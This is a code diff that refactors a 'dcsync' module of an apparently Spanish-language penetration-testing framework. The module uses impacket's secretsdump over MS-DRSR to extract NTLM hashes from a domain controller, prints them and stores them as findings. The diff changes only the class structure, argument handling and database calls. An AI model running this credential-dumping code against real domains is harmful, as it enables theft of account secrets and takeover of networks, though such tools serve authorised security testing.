@@ -12,26 +12,25 @@ Uso:
 Requiere: impacket (secretsdump / NTDSHashes)
 """
 
+from scripts.base import BaseScript
 from core.output import console, print_result
 from core import session_db
 
 
-class Script:
-    NAME        = "dcsync"
-    DESCRIPTION = "DCSync — extrae hashes NTLM del DC vía MS-DRSR (secretsdump)"
+class Script(BaseScript):
+    name        = "dcsync"
+    protocol    = "smb"
+    category    = "post"
+    description = "DCSync — extrae hashes NTLM del DC vía MS-DRSR (secretsdump)"
 
-    def __init__(self, target, creds):
-        self.target = target
-        self.creds  = creds
-
-    def run(self, args):
+    def run(self, **kwargs):
         target      = str(self.target.ip)
-        user        = getattr(args, 'username', None) or (self.creds.username if self.creds else None)
-        password    = getattr(args, 'password', '') or (self.creds.password if self.creds else '')
-        domain      = getattr(args, 'domain',   '') or (self.creds.domain   if self.creds else '')
-        hash_       = getattr(args, 'hash',     None) or (self.creds.hash   if self.creds else None)
-        target_user = getattr(args, 'dc_user',  None)   # --user krbtgt
-        dump_all    = getattr(args, 'all',      False)
+        user        = self.creds.user or kwargs.get('user')
+        password    = self.creds.password or kwargs.get('password', '')
+        domain      = self.creds.domain or kwargs.get('domain', '')
+        hash_       = self.creds.hash or kwargs.get('hash')
+        target_user = kwargs.get('dc_user')   # --user krbtgt
+        dump_all    = kwargs.get('all', False)
 
         if not user:
             console.print("[red]Falta -u USER[/red]")
@@ -108,9 +107,9 @@ class Script:
                     lm    = parts[2] if len(parts) > 2 else ''
                     nt    = parts[3] if len(parts) > 3 else ''
                     console.print(f"  [bold cyan]{uname}[/bold cyan]:{rid}:[dim]{lm}[/dim]:[bold red]{nt}[/bold red]:::")
-                    session_db.save_finding(
-                        category="dcsync_hash",
-                        data={"target": target, "user": uname, "nt_hash": nt, "lm_hash": lm}
+                    session_db.DB.SaveFinding(
+                        target, "SMB", "dcsync_hash",
+                        f"user={uname} nt={nt}"
                     )
                 else:
                     console.print(f"  {secret}")
@@ -164,7 +163,10 @@ class Script:
 
             console.print(f"\n  [bold green]✓ {len(hashes_found)} hashes extraídos[/bold green]")
             for h in hashes_found:
-                session_db.save_finding(category="dcsync_hash", data=h)
+                session_db.DB.SaveFinding(
+                    target, "SMB", "dcsync_hash",
+                    f"user={h.get('user','')} nt={h.get('nt_hash','')}"
+                )
 
         except Exception as e:
             console.print(f"  [red]Error dump NTDS: {e}[/red]")
